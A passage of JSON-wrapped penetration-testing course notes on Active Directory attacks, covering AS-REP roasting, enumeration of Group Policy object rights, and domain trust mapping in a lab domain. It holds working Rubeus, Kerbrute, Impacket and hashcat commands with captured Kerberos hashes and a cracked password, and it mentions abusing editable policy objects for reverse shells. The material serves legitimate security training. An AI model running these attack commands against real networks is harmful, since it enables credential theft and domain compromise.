fl\n\nsamaccountname     : mmorgan\nuserprincipalname  : mmorgan@inlanefreight.local\nuseraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH\n```\n\nWith this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the `/nowrap` flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.\n\n#### Retrieving AS-REP in Proper Format using Rubeus\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> .\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n[*] Action: AS-REP roasting\n\n[*] Target User            : mmorgan\n[*] Target Domain          : INLANEFREIGHT.LOCAL\n\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'\n[*] SamAccountName         : mmorgan\n[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\n[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)\n[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\\mmorgan'\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA\n```\n\nWe can then crack the hash offline using Hashcat with mode `18200`.\n\n#### Cracking the Hash Offline with Hashcat\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n<SNIP>\n\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, AS-REP\nHash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca\nTime.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)\nTime.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 10506240/14344385 (73.24%)\nRejected.........: 0/10506240 (0.00%)\nRestore.Point....: 10493952/14344385 (73.16%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: WellHelloNow -> W14233LTKM\n\nStarted: Fri Apr  1 13:18:37 2022\nStopped: Fri Apr  1 13:18:55 2022\n```\n\nWhen performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.\n\n#### Retrieving the AS-REP Using Kerbrute\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop\n\n2022/04/01 13:14:17 >  Using KDC(s):\n2022/04/01 13:14:17 >  \t172.16.5.5:88\n\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t sbrown@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t jjones@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t tjohnson@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t jwilson@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t bdavis@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t njohnson@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t asanchez@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t dlewis@inlanefreight.local\n2022/04/01 13:14:17 >  [+] VALID USERNAME:\t ccruz@inlanefreight.local\n2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a\n\n<SNIP>\n```\n\nWith a list of valid users, we can use [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.\n\n#### Hunting for Users with Kerberos Pre-auth Not Required\n\nMiscellaneous Misconfigurations\n\n```shell-session\ndrxh3kr@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users \nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9\n[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set\n\n<SNIP>\n```\n\nWe have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.\n\n---\n\n## Group Policy Object (GPO) Abuse\n\nGroup Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.\n\nGPO misconfigurations can be abused to perform the following attacks:\n\n- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)\n- Adding a local admin user to one or more hosts\n- Creating an immediate scheduled task to perform any number of actions\n\nWe can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.\n\nUsing the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.\n\n#### Enumerating GPO Names with PowerView\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> Get-DomainGPO |select displayname\n\ndisplayname\n-----------\nDefault Domain Policy\nDefault Domain Controllers Policy\nDeny Control Panel Access\nDisallow LM Hash\nDeny CMD Access\nDisable Forced Restarts\nBlock Removable Media\nDisable Guest Account\nService Accounts Password Policy\nLogon Banner\nDisconnect Idle RDP\nDisable NetBIOS\nAutoLogon\nGuardAutoLogon\nCertificate Services\n```\n\nThis can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.\n\n#### Enumerating GPO Names with a Built-In Cmdlet\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> Get-GPO -All | Select DisplayName\n\nDisplayName\n-----------\nCertificate Services\nDefault Domain Policy\nDisable NetBIOS\nDisable Guest Account\nAutoLogon\nDefault Domain Controllers Policy\nDisconnect Idle RDP\nDisallow LM Hash\nDeny CMD Access\nBlock Removable Media\nGuardAutoLogon\nService Accounts Password Policy\nLogon Banner\nDisable Forced Restarts\nDeny Control Panel Access\n```\n\nNext, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.\n\n#### Enumerating Domain User GPO Rights\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb> $sid=Convert-NameToSid \"Domain Users\"\nPS C:\\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n\nObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nObjectSID             :\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,\n                        WriteOwner\nBinaryLength          : 36\nAceQualifier          : AccessAllowed\nIsCallback            : False\nOpaqueLength          : 0\nAccessMask            : 983095\nSecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513\nAceType               : AccessAllowed\nAceFlags              : ObjectInherit, ContainerInherit\nIsInherited           : False\nInheritanceFlags      : ContainerInherit, ObjectInherit\nPropagationFlags      : None\nAuditFlags            : None\n```\n\nHere we can see that the Domain Users group has various permissions over a GPO, such as `WriteProperty` and `WriteDacl`, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.\n\n#### Converting GPO GUID to Name\n\nMiscellaneous Misconfigurations\n\n```powershell-session\nPS C:\\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n\nDisplayName      : Disconnect Idle RDP\nDomainName       : INLANEFREIGHT.LOCAL\nOwner            : INLANEFREIGHT\\Domain Admins\nId               : 7ca9c789-14ce-46e3-a722-83f4097af532\nGpoStatus        : AllSettingsEnabled\nDescription      :\nCreationTime     : 10/28/2021 3:34:07 PM\nModificationTime : 4/5/2022 6:54:25 PM\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 0, SysVol Version: 0\nWmiFilter        :\n```\n\nChecking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.\n\n![Graph showing DOMAIN USERS@INLANEFREIGHT.LOCAL with GenericWrite, WriteOwner, and WriteDacl permissions to DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL.](https://academy.hackthebox.com/storage/modules/143/gporights.png)\n\nIf we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.\n\n![Graph showing GpLink from DISCONNECT IDLE RDP@INLANEFREIGHT.LOCAL to APPLICATION@INLANEFREIGHT.LOCAL, which contains multiple ACADEMY-EA-APP nodes.](https://academy.hackthebox.com/storage/modules/143/gpoaffected.png)\n\nWe could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.\n\n---\n\n## Onwards\n\nWe have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:\n\n- Active Directory Certificate Services (AD CS) attacks\n- Kerberos Constrained Delegation\n- Kerberos Unconstrained Delegation\n- Kerberos Resource-Based Constrained Delegation (RBCD)\n\nIn the following few sections, we will briefly cover attacking AD trusts. This is a vast and complicated topic that will be covered in-depth in a later module.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/28-Domain Trusts Primer",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/28-Domain Trusts Primer.md",
    "title": "28 Domain Trusts Primer",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Scenario Many large organizations will acquire new companies over time and bring them into the fold. One way this is done for ease of use is to establish a trust relationship with the new domain. ...",
    "category": "02_CPTS",
    "content": "\n---\n\n## Scenario\n\nMany large organizations will acquire new companies over time and bring them into the fold. One way this is done for ease of use is to establish a trust relationship with the new domain. In doing so, you can avoid migrating all the established objects, making integration much quicker. This trust can also introduce weaknesses into the customer's environment if they are not careful. A subdomain with an exploitable flaw or vulnerability can provide us with a quick route into the target domain. Companies may also establish trusts with other companies (such as an MSP), a customer, or other business units of the same company (such as a division of the company in another geographical region). Let's explore domain trusts more and how we can abuse built-in functionality during our assessments.\n\n---\n\n## Domain Trusts Overview\n\nA [trust](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:\n\n- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.\n- `Cross-link`: A trust between child domains to speed up authentication.\n- `External`: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.\n- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.\n- `Forest`: A transitive trust between two forest root domains.\n- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.\n\nWhen establishing a trust, certain elements can be modified depending on the business case.\n\nTrusts can be transitive or non-transitive.\n\n- A `transitive` trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.\n- In a `non-transitive trust`, the child domain itself is the only one trusted.\n\n![Diagram of servers A, B, C representing domains a.com, b.com, c.com, illustrating A=B, B=C, thus A=C.](https://academy.hackthebox.com/storage/modules/143/transitive-trusts.png)\n\nAdapted from [here](https://zindagitech.com/wp-content/uploads/2021/09/Picture2-Deepak-4.png.webp)\n\n#### Trust Table Side By Side\n\n|Transitive|Non-Transitive|\n|---|---|\n|Shared, 1 to many|Direct trust|\n|The trust is shared with anyone in the forest|Not extended to next level child domains|\n|Forest, tree-root, parent-child, and cross-link trusts are transitive|Typical for external or custom trust setups|\n\nAn easy comparison to make can be package delivery to your house. For a `transitive` trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a `non-transitive` trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.\n\nTrusts can be set up in two directions: one-way or two-way (bidirectional).\n\n- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.\n- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in `INLANEFREIGHT.LOCAL` would be able to access resources in `FREIGHTLOGISTICS.LOCAL`, and vice-versa.\n\nDomain trusts are often set up incorrectly and can provide us with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger & Acquisition (M&A) between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company’s environment if the security posture of the acquired company is unknown and untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain. I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain. This type of \"end-around\" attack could be prevented if security is considered as paramount before establishing any kind of domain trust. As we examine trust relationships, keep these thoughts in mind for reporting. Often, we will find that the larger organization is unaware that a trust relationship exists with one or more domains.\n\nBelow is a graphical representation of the various trust types.\n\n![Diagram of Inlanefreight Forest showing trust types: Parent-child, Cross-link, External, Tree-root, and Forest between domains.](https://academy.hackthebox.com/storage/modules/143/trusts-diagram.png)\n\n---\n\n## Enumerating Trust Relationships\n\nWe can use the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.\n\n#### Using Get-ADTrust\n\nDomain Trusts Primer\n\n```powershell-session\nPS C:\\htb> Import-Module activedirectory\nPS C:\\htb> Get-ADTrust -Filter *\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nForestTransitive        : False\nIntraForest             : True\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : LOGISTICS.INLANEFREIGHT.LOCAL\nObjectClass             : trustedDomain\nObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=INLANEFREIGHT,DC=LOCAL\nTarget                  : LOGISTICS.INLANEFREIGHT.LOCAL\nTGTDelegation           : False\nTrustAttributes         : 32\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False\n\nDirection               : BiDirectional\nDisallowTransivity      : False\nDistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nForestTransitive        : True\nIntraForest             : False\nIsTreeParent            : False\nIsTreeRoot              : False\nName                    : FREIGHTLOGISTICS.LOCAL\nObjectClass             : trustedDomain\nObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource                  : DC=INLANEFREIGHT,DC=LOCAL\nTarget                  : FREIGHTLOGISTICS.LOCAL\nTGTDelegation           : False\nTrustAttributes         : 8\nTrustedPolicy           :\nTrustingPolicy          :\nTrustType               : Uplevel\nUplevelOnly             : False\nUsesAESKeys             : False\nUsesRC4Encryption       : False\n```\n\nThe above output shows that our current domain `INLANEFREIGHT.LOCAL` has two domain trusts. The first is with `LOGISTICS.INLANEFREIGHT.LOCAL`, and the `IntraForest` property shows that this is a child domain, and we are currently positioned in the root domain of the forest. The second trust is with the domain `FREIGHTLOGISTICS.LOCAL,` and the `ForestTransitive` property is set to `True`, which means that this is a forest trust or external trust. We can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts. This is important to note down during an assessment. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across the trust.\n\nAside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the [Get-DomainTrust](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/) function to enumerate what trusts exist, if any.\n\n#### Checking for Existing Trusts using Get-DomainTrust\n\nDomain Trusts Primer\n\n```powershell-session\nPS C:\\htb> Get-DomainTrust \n\nSourceName      : INLANEFREIGHT.LOCAL\nTargetName      : LOGISTICS.INLANEFREIGHT.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n\nSourceName      : INLANEFREIGHT.LOCAL\nTargetName      : FREIGHTLOGISTICS.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:09 PM\nWhenChanged     : 2/27/2022 12:02:39 AM\n```\n\nPowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.\n\n#### Using Get-DomainTrustMapping\n\nDomain Trusts Primer\n\n```powershell-session\nPS C:\\htb> Get-DomainTrustMapping\n\nSourceName      : INLANEFREIGHT.LOCAL\nTargetName      : LOGISTICS.INLANEFREIGHT.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n\nSourceName      : INLANEFREIGHT.LOCAL\nTargetName      : FREIGHTLOGISTICS.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:09 PM\nWhenChanged     : 2/27/2022 12:02:39 AM\n\nSourceName      : FREIGHTLOGISTICS.LOCAL\nTargetName      : INLANEFREIGHT.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : FOREST_TRANSITIVE\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 8:07:08 PM\nWhenChanged     : 2/27/2022 12:02:41 AM\n\nSourceName      : LOGISTICS.INLANEFREIGHT.LOCAL\nTargetName      : INLANEFREIGHT.LOCAL\nTrustType       : WINDOWS_ACTIVE_DIRECTORY\nTrustAttributes : WITHIN_FOREST\nTrustDirection  : Bidirectional\nWhenCreated     : 11/1/2021 6:20:22 PM\nWhenChanged     : 2/26/2022 11:55:55 PM\n```\n\nFrom here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:\n\n#### Checking Users in the Child Domain using Get-DomainUser\n\nDomain Trusts Primer\n\n```powershell-session\nPS C:\\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n\nsamaccountname\n--------------\nhtb-student_adm\nAdministrator\nGuest\nlab_adm\nkrbtgt\n```\n\nAnother tool we can use to get Domain Trust is `netdom`. The `netdom query` sub-command of the `netdom` command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.\n\n#### Using netdom to query domain trust\n\nDomain Trusts Primer\n\n```cmd-session\nC:\\htb> netdom query /domain:inlanefreight.local trust\nDirection Trusted\\Trusting domain                         Trust type\n========= =======================                         ==========\n\n<->       LOGISTICS.INLANEFREIGHT.LOCAL\nDirect\n Not found\n\n<->       FREIGHTLOGISTICS.LOCAL\nDirect\n Not found\n\nThe command completed successfully.\n```\n\n#### Using netdom to query domain controllers\n\nDomain Trusts Primer\n\n```cmd-session\nC:\\htb> netdom query /domain:inlanefreight.local dc\nList of domain controllers with accounts in the domain:\n\nACADEMY-EA-DC01\nThe command completed successfully.\n```\n\n#### Using netdom to query workstations and servers\n\nDomain Trusts Primer\n\n```cmd-session\nC:\\htb> netdom query /domain:inlanefreight.local workstation\nList of workstations with accounts in the domain:\n\nACADEMY-EA-MS01\nACADEMY-EA-MX01      ( Workstation or Server )\n\nSQL01      ( Workstation or Server )\nILF-XRG      ( Workstation or Server )\nMAINLON      ( Workstation or Server )\nCISERVER      ( Workstation or Server )\nINDEX-DEV-LON      ( Workstation or Server )\n...SNIP...\n```\n\nWe can also use BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query. Here we can easily see that two bidirectional trusts exist.\n\n#### Visualizing Trust Relationships in BloodHound\n\n![Graph showing domain relationships: INLANEFREIGHT.LOCAL connected to LOGISTICS.INLANEFREIGHT.LOCAL and FREIGHT.LOGISTICS.LOCAL. Sidebar with pre-built analytics queries.](https://academy.hackthebox.com/storage/modules/143/BH_trusts.png)\n\n---\n\n## Onwards\n\nIn the following few sections, we will cover common attacks that we can perform against child --> parent domain trusts and across bidirectional forest trusts. These types of attacks should not be overlooked, but we should always check with our client to ensure that any trusts we uncover during our enumeration are in scope for the assessment and we are not going outside the Rules of Engagement.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/29- Attacking Domain Trusts - Child -> Parent Trusts - from Windows",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/29- Attacking Domain Trusts - Child -> Parent Trusts - from Windows.md",
    "title": "29  Attacking Domain Trusts   Child  > Parent Trusts   From Windows",
    "tags": [],
    "date": "2025-09-17",
